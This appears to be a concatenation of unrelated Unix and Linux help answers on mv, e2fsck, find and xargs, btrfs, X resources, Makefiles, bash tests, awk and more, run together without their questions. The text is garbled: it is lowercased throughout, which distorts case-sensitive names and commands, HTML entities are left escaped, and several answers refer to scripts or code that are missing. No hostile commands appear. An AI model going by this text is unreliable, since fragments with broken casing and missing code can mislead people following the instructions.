looking at the source code for mv , http://www.opensource.apple.com/source/file_cmds/file_cmds-220.7/mv/mv.c : as you pointed out in your comment , regular files can not be created in /dev , so even after /dev/null is unlinked , the open(to, O_CREAT | O_EXCL | O_TRUNC | O_WRONLY, 0) is still going to fail . i would file a bug report with apple . the mv source code is mostly unchanged from the freebsd version , but because osx 's devfs has that non-posix behavior with regular files , apple should fix their mv .
i was going to suggest hacking e2fsck to disable the specific checks for a last mount time or last write times in the future . these are defined in problem . c / problem . h , and used in super . c . but in looking , i discovered that e2fsprogs 1.41.10 adds a new option to /etc/e2fsck.conf called broken_system_clock . this seems to be exactly what you need , and since you are using red hat enterprise linux 6 , you should have 1.41.12 , which includes this option . from the man page : yes , the man page can not spell " heuristics " . oops . but presumably the code works anyway . : )
make tail -f beep once for every line : bel=`echo foo | tr -c -s '\007' '\007'` tail -F file | sed "s/\$/$bel/"  as for using the shell to compute a moving average , here 's a bash script that tracks the number of r0 and r1 lines within a moving window of size $windowsize . tracking variables are r0sum and r1sum .
these warnings are triggered because of firmware errors . try a newer bios version which hopefully fixes these errors . if you do not have access to newer bios , you can try overriding your dsdt/ssdt with tables that got the faulty code replaced/removed . it does not seem to be harmful , perhaps it is some thermal health/throttle check that is invoked every 240 seconds ( 4 minutes ) . as for the technical details , these messages originates from the acpi core . the \_GPE._Lxx methods are level-triggered interrupts if i remember correctly and are triggered by the hardware ( not linux ) . apparently this specific methods tries to evaluate some method or object at \_TZ.THRM which failed because this acpi scope does not exist .
i finally ended up using fatsort , which does the job nicely , and it is also a lot quicker than copying the files over and over .
i got the thing working after fiddling around with it today , but i have not been able to pinpoint what the problem was when i tried it last time ( i did switch to linux mint in the interim ; maybe that solved the issue somehow . ) here 's the working script for anyone interested : and my ~/.dmenurc: DMENU_FONT='-*-*-medium-r-*-*-18-*-*-*-*-*-*-*' DMENU="dmenu -i -fn $DMENU_FONT -nb #1E2320 -nf #DBDBDB -sb #3f3f3f -sf #ffffff"  all you need to is put the script somewhere on your $path , make it executable , and bind a key to it .
use find in conjunction with xargs . the only reason i am recommending find is to take advantage of the -print0 option , which separates file names by nuls ; this helps avoid issues with file names containing spaces . find . -maxdepth 1 -type f -print0 | xargs -0 wc 
unless you specified otherwise when you formatted , the default is to store duplicate copies of the metadata blocks for improved reliability . you probably have 2gb worth of metadata that is stored twice , using 4gb . you can see more details with btrfs filesystem df .
and if you want to search three folders named foo , bar , and baz for all "* . py " files , use this command : find foo bar baz -name "*.py" so if you want to display files from dir1 dir2 dir3 use find dir1 dir2 dir3 -type f try this find . \( -name "dir1" -o -name "dir2" \) -exec ls '{}' \;
the drwx------ on your home directory is preventing other users from traversing it , i.e. seeing the downloads folder and its contents . you can let others through to see files they know the path to but prevent them from listing your files with --x perms , so you will want to chmod 711 /home/trusktr , and check that other files and directories in there have appropriate permissions .
the bash wiki explains this quite well . paraphrasing : read data to execute process quotes split the read data into commands parse special operators perform expansions split the command into a command name and arguments execute the command
xrdb -query lists the resources that are explicitly loaded on the x server . appres lists the resources that an application would receive . this includes system defaults ( typically found in a directories like /usr/X11R6/lib/X11/app-defaults or /etc/X11/app-defaults ) as well as the resources explicitly set on the server with xrdb . you can restrict a particular class and instance , e.g. appres XTerm foo to see what resources apply to an xterm invoked with xterm -name foo . the x server only stores a list of settings . it cannot know whether a widget will actually make use of these settings . invalid resource names go unnoticed because you are supposed to be able to set resources at a high level in the hierarchy , and they will only apply to the components for which they are relevant and not overridden . x resource specs obey fairly intricate precedence rules . if one of your settings does not seem to apply , the culprit is sometimes a system default that takes precedence because it is more specific . look at the output of appres Class to see if there is a system setting for something .reverseVideo . if your application is one of the few that support the editres protocol , you can inspect its resource tree with the editres program .
the clone ( 2 ) system call in linux is said to have been modeled after plan 9 's rfork ( ) (http://news.ycombinator.com/item?id=863939, i personally do not see how the timing works out ) . this paper : http://www.kernel.org/doc/ols/2006/ols2006v1-pages-101-112.pdf claims that plan 9 inspired the " mount/filesystem namespace " . the /proc filesystem appears to have come to plan 9 from 8th edition unix : http://en.wikipedia.org/wiki/procfs , rather than the other way around .
you could use any local dns caching daemon like dnsmasq or bind in a caching-only configuration . then the most recent responses will be cached locally and multiple instances of wget will not trigger extra queries over the network for the same names . wget may be set to --no-dns-cache to save some memory at cost of performance .
your windows machines can use netbios name resolution to tell each other about themselves . this is microsoft specific protocol and does not work with linux/unix machines , which use a static file ( /etc/hosts ) or the domain name service ( dns ) for name resolution . your windows machines will not recognise the avahi service without installing one on each machine ( i believe apple provide one ) . you have a few options : edit the hosts file mentioned above on all computers ( it is in C:\Windows\System32\drivers\etc on windows and in /etc/ on linux ) . as a minimum , you will have to add all linux machines/vms to it . run a dns server on one of your machines . install samba on your debian vm . this is a service that allows a linux machine to share it is files with windows client . it also happens to announce the host using the netbios name resolution service so your windows machines will be able to see the linux vm by name . as @joeldavies comments , this will be one way only . it will not allow the debian vm to access all other windows machines by name , but will allow all windows machines to access the debian by name .
ssh "$1" "find /var/images -type f -print0" | xargs --null --replace --max-procs=X rsync "${1}:{}" /my/destination  should do the trick .
you really should read pacman 's output : the arch wiki intel page has a little more detail on the move to sna as the default acceleration method .
looking through the man page for indent and the official gnu documentation i only see 2 methods for controlling this behavior . the environment variables : simple_backup_suffix version_width i tried various tricks of setting the width to 0 and also setting the simple_backup_width to nothing ( "" ) . neither had the desired effect . i think you are only course of action would be to create a shell alias and/or function to wrap the command indent to do what you want . example $ function myindent() { indent "$@"; rm "$@"~; }  then when i run it : $ myindent ev_epoll.c  i get the desired effect : $ ls -l | grep ev_epo -rw-r--r--. 1 saml saml 7525 Dec 13 18:07 ev_epoll.c 
convert the number to hex ( in this case A ) and then do : echo -en '\xA' &gt; file 
if your partition is ext2 , ext3 or ext4 , you can use the e2label command to set the label :  e2label - Change the label on an ext2/ext3/ext4 filesystem SYNOPSIS e2label device [ new-label ]  after you have set the label to , say , " data " you can add a line in /etc/fstab like this one LABEL=data /mnt/data ext4 noauto,users,rw 0 0  then you just need to say mount /mnt/data . if you do not want to modify fstab you can use mount 's -l option to specify the label : mount -L data /mnt/data 
here 's a list of typical mistakes people make with makefiles . issue #1 - using spaces instead of tabs the command make is notoriously picky about the formatting in a Makefile . you will want to make sure that the action associated with a given target is prefixed by a tab and not spaces . that is a single tab followed by the command you want to run for a given target . example this being your target . main.out: GradeBook.o main.o  the command that follows should have a single tab in front of it .  g++ -Wall -g -o main.out GradeBook.o main.o ^^^^--Tab  here is your makefile cleaned up issue #2 - naming it wrong the tool make is expecting the file to be called Makefile . anything else , you need to tell make what file you want it to use . $ make -f mafile -or- $ make --file=makefile -or- $ make -f smurfy_makefile  note : if you name your file Makefile , then you can get away with just running the command : $ make  issue #3 - running makefiles Makefile 's are data files to the command make . they are not executables . example make it executable $ chmod +x makefile  run it other isues beyond the above tips i would also advice you to make heavy use of make 's ability to do " dry-runs " or " test mode " . the switches : example running the file makefile . $ make -n -f makefile g++ -Wall -g -c GradeBook.cpp g++ -Wall -g -c main.cpp g++ -Wall -g -o main.out GradeBook.o main.o  but notice that none of the resulting files were actually created when we ran this :
so it seems that the cause was that i was using | bash when i was calling the script . in other words name: /srv/salt/config/nginx/compiler.sh | bash should have been name: /srv/salt/config/nginx/compiler.sh and so the salt .sls should have been : and then the file , which i turned to : ran and it installed as hoped . hope this saves someone some time .
sourcing the changed file will provide access to the newly written alias or function in the current terminal , for example : source ~/.bashrc an alternative syntax : . ~/.bashrc  note that if you have many instances of bash running in your terminal ( you mentionned multiple tabs ) , you will have to run this in every instance .
the ports system provides a make target to display runtime and buildtime dependencies see the ports man page . so you should be able to use make pretty-print-run-depends-list pretty-print-build-depends-list to get a list of dependencies . you can use these targets to make a shell script to follow the dependencies ( this was a stupid quick hack so there is probably a better way ) . for webalizer you will find at least this build dependency path to python webalizer-> gd-> tiff-> freeglut-> libglu-> libgl-> /usr/ports/lang/python
i know that this might not help anyone , but it hibernates now that i updated to 11.04 natty . i am still using the nvidia drivers and all the peripherals are the same .
because there is no provision in bash for interpreting them . as shown in the prompting section of the bash(1) man page , only octal escapes are allowed for an arbitrary character . as for why this omission exists , i can only surmise that it is for compatibility with posix sh , but you will need to ask chet ramey himself as even version 4.12 of the bash faq does not yet cover this topic .
you could check if you are running in a graphical terminal and only set TMOUT if you are not . an easy way to do this is the tty command :  tty - print the file name of the terminal connected to standard input  when run from a gui terminal emulator : $ tty /dev/pts/5  when run from a virtual console : $ tty /dev/tty2  so , adding these lines to your ~/.profile should kill your bash session after ten minutes : tty | grep tty &gt;/dev/null &amp;&amp; export TMOUT=600 
from what i an see , reading the funtoo documentation , another usp here will perhaps be the simplified kernel build in the install . # echo "sys-kernel/sysrescue-std-sources binary" &gt;&gt; /etc/portage/package.use # emerge sysrescue-std-sources  from http://www.funtoo.org/wiki/funtoo_linux_installation#configuring_and_installing_the_linux_kernel
i found this au q and a : unable to install ubuntu on lenovo y500 . there are some suggestions you could try from this thread . i also found these things to try . i do not know how relevant they are , but might be worth trying : linlap.com/lenovo_ideapad_y500 . this au q and a also looks related : lenovo y500 dual booting ubuntu and windows 8: stuck on purple screen .
short answer : yes . longer answer : depends on what the cronjobs do and when they do it , i.e. computation-heavy ( performance-degrading ) tasks run at night ( or when no one is in the office , depends on what the server is used for ) do not hurt ( if they are finished before office hours , of course ) . if there is a limit ( i am not sure ) , it is probably way beyond 30 . anyways , it seems a little uncommon to have that many cronjobs ( someone correct me if i am wrong ) , but without more information , it is impossible to say if there is a better solution . ( this is just a first approximation to an answer , i doubt it can be fully answered in this generality . ) you could also read up on nice ( not sure if it exists on solaris ) . the solaris resource management ( 1 ) , ( 2 ) also sounds useful , depending on the type of your jobs .
if your source code already have debian configuration files , you will just need to run ( in the sorce directory ) : dpkg-buildpackage otherwise you can create a deb package with checkinstall launch the configure script first , e . g ./configure --prefix=/usr , then do checkinstall --install=no it will ask few questions , just fill the fields , so you can identify it laterly . if it successed , you will see a * . deb package out of the source directory . copy and install it on the other computer .
note that kde is a group of packages and when upgrading with pacman it would typically upgrade individual packages in that group . look in /var/log/pacman.log to see exactly which packages that were upgraded . you should be able to downgrade the package that source your problem there , by locating the previous version of the package in /var/cache/pacman/pkg/&lt;pkg_name&gt;-&lt;ver&gt;-&lt;arch&gt;.pkg.tar.xz . from there your simply install the old version with # pacman -U /var/cache/pacman/pkg/&lt;pkg_name&gt;-&lt;ver&gt;-&lt;arch&gt;.pkg.tar.xz 
sed '/^[0-9]/{:a;s/[\t\\n ]\+/,/g;N;/\\n[A-Z]/!ba;}'  will do the stuff . explanation : /^[0-9]/ will match only to lines started with number and apply command group to it {} command group to apply {:a;s/[\t\\n ]\+/,/g;N;/\\n[A-Z]/!ba;} will read in cycle line by line and replace all spaces , tabs and newlines to comma until line started with letter .
the problem is the missing blank . the following code will work : if [ "$DAYOFWEEK" == 4 ]; then echo YES; else echo NO; fi  but keep in mind ( see help test ) : == is not officially mentioned , you should use = for string compare -eq is intended for arithmetic tests i would prefer :  if [ "${DAYOFWEEK}" -eq 4 ]; then echo YES; else echo NO; fi  generally you should prefer the day number approach , because it has less dependency to the current locale . on my system the output of date +"%a" is today Do .
the arch linux wiki gave me the correct clues , but the actual way to do it is to do the following : gsettings set org.cinnamon.desktop.background picture-uri "file://&lt;path to file&gt;" 
well , i got something not too gross to fix the issue : in my script where i am creating screen sessions , i have near the top : now , when i connect to my-session , terminal colors work . not entirely satisfactory , but works well enough .
you lack the make command . make is a utility that is often used to build programs from source ; it runs the compiler on every source file in the right order . you need to install the make package , and possibly others : the c compiler , and the kernel headers ( files generated during the compilation of the linux kernel , that are necessary to compile third-party modules ) . i hardly ever use centos , but i think the right command is : yum install gcc make kernel-devel  or ( will install more than you need ) yum groupinstall "Development Tools"  you may need to install other packages as well . you need to run this command as root ; depending on whether you use su or sudo: su -c 'yum install \u2026' sudo yum install \u2026 
use lsof | grep /media/whatever to find out what is using the mount . also , consider umount -l ( lazy umount ) to prevent new processes from using the drive while you clean up .
* containing a non-quoted wildcard character ( being itself a wildcard character ) , it is considered as a glob and expanded by the shell to the list of files that match that pattern . that specific pattern ( * ) , matches any non-hidden file names , so , before calling find the shell will expand it to the list of non-hidden files in the current directory , so if the current directory contains a file called foo and another called foo bar , it will call find with those arguments : "find", "/etc/", "foo", "foo bar"  if there is no non-hidden file in the current directory , the behavior varies among shells . csh , tcsh , fish , zsh will issue a no match error message and not run the command , while the posix shells will still call find but with the pattern unexpanded . so in those , find will be called with these arguments : "find", "/etc/", "*"  ( which is asking find to find all the files in /etc/ and in * ( which in this case does not exist ) ) . most probably , on redhat , you are calling that command from a directory that does contain non-hidden files , while on debian , you are calling it from on that contains only hidden files . by the way cat $(find /etc/ *) 2&gt;/dev/null | grep $(hostname)  is wrong . you should write it : find /etc -type f -exec cat {} + | grep -Fe "$(hostname)"  or probably more useful : find /etc -type f -exec grep -Fe "$(hostname)" {} +  or since both debian and redhat have the gnu grep : grep -rFe "$(hostname)" /etc 
what worked for me is moving the -bordercolor option before the actual -border statement : convert tmp.pdf\[0\] -background white -alpha remove -bordercolor black -border 8 cover.png  should do the trick . i can not find anything in the man page that points to why this should be so , though .
you can use the match() function in awk: $ cat file somedata45 somedata47 somedata67 somedata53 somedata23 somedata12  we set the record separator to nothing effectively enabling the paragraph mode ( separated by blank line ) . the second line in each paragraph becomes our $2 , third line becomes $3 etc . we set the output field separator to newline . due to the paragraph mode , we also set output record separator to two newlines . the output will give you an extra newline at the end . we use the match() function to identify the start of number . when a match is found , the function populates two variables for us , RSTART and RLENGTH indicating when the match starts and how long it is . we use those variables to do our calculation and store the result in variable called value . we use the substr function to locate the numbers . we repeat the same for $3 and this time we use substr function to print up to where our numbers start and replace the number piece with our variable that contains the calculated value from previous line . please refer the string functions in the user guide for more details . update based on real data : your real data actually makes it a lot simpler . you look for the line with uidNumber and capture the last field . when you see a line with sambaSID you split the last field on - and modify the last element to your new calculated value . you then use a for loop to re-assemble your last field .
